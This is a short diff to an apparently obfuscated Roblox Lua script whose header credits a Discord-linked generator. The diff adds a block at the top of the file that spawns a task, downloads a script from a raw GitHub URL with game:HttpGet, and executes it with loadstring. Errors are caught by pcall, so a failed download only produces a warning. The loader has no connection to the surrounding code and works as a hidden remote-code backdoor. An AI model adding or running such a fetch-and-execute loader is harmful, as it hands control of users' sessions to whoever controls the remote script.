@@ -1,4 +1,12 @@
--- This file was generated at discord.gg/syncrypt
+
+task.spawn(function()
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ricardojrgavin-afk/Scripts/refs/heads/main/Bruh"))()
+    end)
+    if not success then
+        warn("Script failed to load:", err)
+    end
+end)
 
 local t2
 do
